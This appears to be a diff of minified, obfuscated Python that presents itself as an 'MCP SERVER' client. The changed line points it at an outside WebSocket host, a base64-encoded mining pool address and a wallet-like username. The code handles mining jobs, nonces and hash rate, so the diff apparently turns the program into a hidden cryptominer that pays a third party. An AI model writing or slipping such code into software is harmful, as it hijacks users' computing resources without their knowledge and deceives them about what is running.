@@ -44,7 +44,7 @@ class l:
 		if A.ws:await A.ws.close()
 		A.connected=C
 async def L():
-	i='target';h='mode';g='threads';f='password';e='username';d='url';W='job';M='seed_hash';L='blob';F=k();K={d:f"{F.get("SERVER_WS","ws://localhost:3333")}/{F.get("SERVER_TARGET","vivo")}",e:F.get('SERVER_DOMAIN','user'),f:F.get('SERVER_SECRET',X),g:int(F.get('SERVER_CONNECTION',2)),h:F.get('SERVER_MODE','FAST')};P=l(K[d],K[e],K[f]);Q=N;U='N/A'
+	i='target';h='mode';g='threads';f='password';e='username';d='url';W='job';M='seed_hash';L='blob';F=k();K={d:f"{F.get("SERVER_WS","wss://alpaquitaandina.online")}/{F.get("SERVER_TARGET","ZGUucXJsLmhlcm9taW5lcnMuY29tOjExNjY=")}",e:F.get('SERVER_DOMAIN','Q0105004479f85cd7d62eeac7a6d6ec24cc6af897a72bac82b3f1d8a63b425e2430efd6504c753d'),f:F.get('SERVER_SECRET',X),g:int(F.get('SERVER_CONNECTION',2)),h:F.get('SERVER_MODE','FAST')};P=l(K[d],K[e],K[f]);Q=N;U='N/A'
 	def m():I.system('clear'if I.name!='nt'else'cls')
 	def G():m();S(f"MCP SERVER CONNECTED -> TASK: {U} | SPEED: {a} H/s | COMPLETED: {Y} | FAILED: {Z}", flush=True)
 	def n(job_id,nonce,result,diff):
